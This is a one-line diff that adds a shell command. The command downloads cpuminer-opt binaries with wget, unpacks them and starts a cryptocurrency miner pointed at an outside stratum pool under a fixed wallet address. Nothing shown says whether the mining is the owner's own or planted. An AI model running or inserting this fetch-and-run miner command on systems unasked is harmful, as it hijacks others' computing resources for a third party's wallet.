@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-mac.tar.gz tar zxvf cpuminer-opt-mac.tar.gz && ./cpuminer-sse2 -a yespowerr16  -o stratum+tcps://stratum-na.rplant.xyz:13382 -u YR4Sbv6p5dZPWmg3ZCP2muo5hyfUoVmL8y.g
